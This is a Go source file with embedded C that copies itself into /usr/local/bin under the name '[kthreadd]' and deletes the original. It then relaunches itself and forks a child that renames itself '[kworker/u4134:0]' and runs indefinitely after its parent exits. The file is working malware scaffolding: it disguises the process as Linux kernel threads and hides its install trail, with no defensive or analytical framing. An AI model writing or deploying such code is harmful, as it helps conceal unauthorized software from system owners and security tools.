package main

/*
#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>

int runWork(){
    if (fork() == 0 ){
        // Inside the child process
        // We do not set PR_SET_PDEATHSIG because we want it to survive the parent's death

        //Change name to look like a kernel worker
        prctl(PR_SET_NAME, "[kworker/u4134:0]");

        while(1) {
            sleep(5);
        }
    }

    return 0;
}
*/
import "C"

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

const installDir = "/usr/local/bin"

func main() {

	binName := "[kthreadd]"

	installedPath := filepath.Join(installDir, binName)

	currentPath, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not determine current executable path : %v\n", err)
		os.Exit(1)
	}
	currentPath, err = filepath.EvalSymlinks(currentPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not resolve executable path: %vn\n", err)
		os.Exit(1)
	}

	if currentPath == installedPath {
		doWork(os.Args[1:])
		return
	}

	fmt.Printf("First run detected. Installing to %s.....\n", installedPath)

	if err := installSelf(currentPath, installedPath); err != nil {
		fmt.Fprintf(os.Stderr, "installation failed: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("Installed successfully.")

	if err := os.Remove(currentPath); err != nil {
		fmt.Fprintf(os.Stderr, "warning: could not remove original at %s: %v\n", currentPath, err)
	} else {
		fmt.Printf("Removed original copy at %s\n", currentPath)
	}

	cmd := exec.Command(installedPath, os.Args[1:]...)
	cmd.Path = installedPath
	cmd.Args[0] = "[kthreadd]"
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			os.Exit(exitErr.ExitCode())
		}
		fmt.Fprintf(os.Stderr, "failed to run installed binary: %v\n", err)
		os.Exit(1)
	}
}

func installSelf(srcPath, destPath string) error {
	if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
		return fmt.Errorf("creating install dir: %w", err)
	}

	src, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("opening source binary: %w", err)
	}
	defer src.Close()

	tmpDest := destPath + ".tmp"
	dst, err := os.OpenFile(tmpDest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return fmt.Errorf("creating destination %w", err)
	}

	if _, err := io.Copy(dst, src); err != nil {
		dst.Close()
		os.Remove(tmpDest)
		return fmt.Errorf("copying binary: %w", err)
	}
	if err := dst.Close(); err != nil {
		os.Remove(tmpDest)
		return fmt.Errorf("closing destination: %w", err)
	}

	if err := os.Rename(tmpDest, destPath); err != nil {
		os.Remove(tmpDest)
		return fmt.Errorf("renaming into place: %w", err)
	}
	return nil
}

func doWork(args []string) {
	fmt.Println("Running installed tool with args: ", args)
	C.runWork()
}
